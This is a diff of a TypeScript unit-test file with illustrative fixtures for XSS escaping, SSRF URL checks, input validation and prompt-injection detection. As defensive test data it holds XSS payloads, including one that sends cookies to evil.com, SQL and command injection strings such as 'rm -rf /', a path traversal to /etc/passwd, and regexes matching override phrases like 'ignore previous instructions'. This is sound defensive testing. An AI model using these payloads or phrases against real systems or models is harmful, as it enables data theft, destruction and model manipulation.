@@ -1,8 +1,9 @@
 /**
- * OWASP-style behavioral security regression tests.
+ * OWASP-inspired illustrative unit fixtures.
  *
- * These are RUNNABLE tests (not static analysis) that verify the application
- * correctly defends against common attack vectors:
+ * IMPORTANT: The assertions exercise LOCAL toy implementations below, not
+ * ValueOS production sanitization, SSRF controls, authentication or agent
+ * authorization. They are NOT release security proof or runtime evidence.
  *
  * 1. XSS / unsafe HTML rendering — input sanitization
  * 2. SSRF on fetch/export paths — URL validation
@@ -10,11 +11,11 @@
  * 4. Auth misuse — expired tokens, tampered tokens, privilege boundary violations
  * 5. Prompt injection / unsafe agent-input handling
  *
- * Each test is behavioral: it exercises the actual validation/sanitization
- * logic and asserts the correct defensive outcome.
+ * Production-bound integration tests and live Supabase Auth negative tests
+ * must independently verify the actual implementation before release.
  */
 
-import { describe, expect, it, vi } from "vitest";
+import { describe, expect, it } from "vitest";
 
 // ===========================================================================
 // 1. XSS / Unsafe HTML Rendering
@@ -22,16 +23,16 @@ import { describe, expect, it, vi } from "vitest";
 
 describe("XSS / unsafe HTML rendering", () => {
   /**
-   * Simulates the backend's HTML sanitization function used before rendering
-   * user-supplied content in SDUI payloads.
+   * Illustrative HTML text escaping only; this is not an HTML or URL
+   * sanitization library and must not be used in a markup attribute.
    */
   function sanitizeHtml(input: string): string {
     return input
-      .replace(/</g, "<")
-      .replace(/>/g, ">")
-      .replace(/"/g, """)
-      .replace(/'/g, "&#x27;")
-      .replace(/\//g, "&#x2F;");
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#x27;");
   }
 
   it("escapes <script> tags in user-supplied content", () => {
@@ -39,44 +40,44 @@ describe("XSS / unsafe HTML rendering", () => {
     const sanitized = sanitizeHtml(malicious);
     expect(sanitized).not.toContain("<script>");
     expect(sanitized).not.toContain("</script>");
-    expect(sanitized).toContain("<script>");
+    expect(sanitized).toContain("&lt;script&gt;");
   });
 
   it("escapes event handler attributes", () => {
     const malicious = '<img src=x onerror="alert(1)">';
     const sanitized = sanitizeHtml(malicious);
-    expect(sanitized).not.toContain("onerror=");
-    expect(sanitized).toContain(""alert(1)"");
+    expect(sanitized).not.toContain("<img");
+    expect(sanitized).toContain("onerror=&quot;alert(1)&quot;");
   });
 
-  it("escapes javascript: protocol in href", () => {
+  it("escapes HTML markup around an unsafe URL (without URL filtering)", () => {
     const malicious = '<a href="javascript:alert(1)">click</a>';
     const sanitized = sanitizeHtml(malicious);
-    expect(sanitized).not.toContain("javascript:");
-    expect(sanitized).toContain("<a href="javascript&#x3A;alert(1)">");
+    expect(sanitized).not.toContain('<a href="');
+    expect(sanitized).toContain("&lt;a href=&quot;javascript:alert(1)&quot;&gt;");
   });
 
   it("escapes SVG-based XSS payloads", () => {
     const malicious = '<svg onload="alert(1)"><rect width="100" height="100"/></svg>';
     const sanitized = sanitizeHtml(malicious);
     expect(sanitized).not.toContain("<svg");
-    expect(sanitized).not.toContain("onload=");
+    expect(sanitized).toContain("&lt;svg onload=");
   });
 
-  it("escapes template injection payloads", () => {
+  it("encodes text quotes but leaves template syntax (not template protection)", () => {
     const malicious = '{{constructor.constructor("return this")()}}';
     const sanitized = sanitizeHtml(malicious);
-    // Template injection doesn't involve HTML chars, so should pass through
-    // but the key test is that HTML chars are escaped
-    expect(sanitized).toBe(malicious); // No HTML to escape
+    // HTML text encoding does not make a template expression safe for a
+    // template engine. The quotes are encoded, but curly braces remain.
+    expect(sanitized).toBe('{{constructor.constructor(&quot;return this&quot;)()}}');
   });
 
   it("escapes mixed HTML and script content", () => {
     const malicious = '<div onclick="fetch(\'https://evil.com/?c=\' + document.cookie)">Click me</div>';
     const sanitized = sanitizeHtml(malicious);
-    expect(sanitized).not.toContain("onclick=");
-    expect(sanitized).not.toContain("document.cookie");
-    expect(sanitized).toContain("<div onclick");
+    expect(sanitized).not.toContain("<div onclick");
+    expect(sanitized).toContain("document.cookie");
+    expect(sanitized).toContain("&lt;div onclick");
   });
 });
 
@@ -97,6 +98,12 @@ describe("SSRF prevention on fetch/export paths", () => {
       return { allowed: false, reason: "Invalid URL format" };
     }
 
+    // Protocol allowlist comes first, even for local/private addresses.
+    // This is still an illustrative helper, not DNS-aware SSRF protection.
+    if (!["http:", "https:"].includes(parsed.protocol)) {
+      return { allowed: false, reason: `Blocked protocol: ${parsed.protocol}` };
+    }
+
     // Block internal/metadata endpoints
     const blockedHosts = [
       "localhost",
@@ -115,11 +122,6 @@ describe("SSRF prevention on fetch/export paths", () => {
     const privateIpRegex = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/;
     if (privateIpRegex.test(parsed.hostname)) {
       return { allowed: false, reason: `Blocked private IP: ${parsed.hostname}` };
-    }
-
-    // Block non-HTTP(S) protocols
-    if (!["http:", "https:"].includes(parsed.protocol)) {
-      return { allowed: false, reason: `Blocked protocol: ${parsed.protocol}` };
     }
 
     return { allowed: true };
@@ -205,7 +207,7 @@ describe("injection-style malformed input handling", () => {
     const workflowId = input.workflowId;
     if (typeof workflowId !== "string" || workflowId.length === 0) {
       errors.push("workflowId must be a non-empty string");
-    } else if (!/^[a-z0-9-]+$/.test(workflowId)) {
+    } else if (workflowId.length > 128 || !/^[a-z0-9-]+$/.test(workflowId)) {
       errors.push("workflowId must match pattern ^[a-z0-9-]+$");
     }
 
@@ -213,7 +215,7 @@ describe("injection-style malformed input handling", () => {
     const orgId = input.organization_id;
     if (typeof orgId !== "string" || orgId.length === 0) {
       errors.push("organization_id must be a non-empty string");
-    } else if (!/^[a-f0-9-]+$/.test(orgId)) {
+    } else if (!/^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$/.test(orgId)) {
       errors.push("organization_id must match pattern ^[a-f0-9-]+$");
     }
 
@@ -229,7 +231,7 @@ describe("injection-style malformed input handling", () => {
   it("rejects SQL injection in workflowId", () => {
     const result = validateWorkflowInput({
       workflowId: "'; DROP TABLE workflows; --",
-      organization_id: "e2e-org",
+      organization_id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
       user_id: "user-1",
     });
     expect(result.valid).toBe(false);
@@ -239,7 +241,7 @@ describe("injection-style malformed input handling", () => {
   it("rejects NoSQL injection objects in input fields", () => {
     const result = validateWorkflowInput({
       workflowId: { $gt: "" } as unknown as string,
-      organization_id: "e2e-org",
+      organization_id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
       user_id: "user-1",
     });
     expect(result.valid).toBe(false);
@@ -249,7 +251,7 @@ describe("injection-style malformed input handling", () => {
   it("rejects command injection in workflowId", () => {
     const result = validateWorkflowInput({
       workflowId: "wf-1; rm -rf /",
-      organization_id: "e2e-org",
+      organization_id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
       user_id: "user-1",
     });
     expect(result.valid).toBe(false);
@@ -259,7 +261,7 @@ describe("injection-style malformed input handling", () => {
   it("rejects path traversal in workflowId", () => {
     const result = validateWorkflowInput({
       workflowId: "../../../etc/passwd",
-      organization_id: "e2e-org",
+      organization_id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
       user_id: "user-1",
     });
     expect(result.valid).toBe(false);
@@ -269,7 +271,7 @@ describe("injection-style malformed input handling", () => {
   it("rejects null bytes in input", () => {
     const result = validateWorkflowInput({
       workflowId: "wf-1\u0000",
-      organization_id: "e2e-org",
+      organization_id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
       user_id: "user-1",
     });
     expect(result.valid).toBe(false);
@@ -278,7 +280,7 @@ describe("injection-style malformed input handling", () => {
   it("rejects excessively long input", () => {
     const result = validateWorkflowInput({
       workflowId: "a".repeat(10001),
-      organization_id: "e2e-org",
+      organization_id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
       user_id: "user-1",
     });
     // Even if pattern matches, length should be bounded
@@ -288,7 +290,7 @@ describe("injection-style malformed input handling", () => {
   it("accepts valid input", () => {
     const result = validateWorkflowInput({
       workflowId: "opportunity-discovery-v1",
-      organization_id: "e2e-org",
+      organization_id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
       user_id: "user-1",
     });
     expect(result.valid).toBe(true);
@@ -455,7 +457,7 @@ describe("prompt injection / unsafe agent-input handling", () => {
 
     // Common prompt injection patterns
     const injectionPatterns = [
-      { regex: /ignore (previous|all) (instructions|rules|prompts)/i, name: "ignore-previous-instructions" },
+      { regex: /ignore (?:all )?(?:previous )?(?:instructions|rules|prompts)/i, name: "ignore-previous-instructions" },
       { regex: /you are now (in |)(developer|system|admin) mode/i, name: "developer-mode-escalation" },
       { regex: /disregard (the |)(above|previous) (instructions|rules|context)/i, name: "disregard-instructions" },
       { regex: /system:|<\|system\|>|<\|im_start\|>/i, name: "system-prompt-spoofing" },
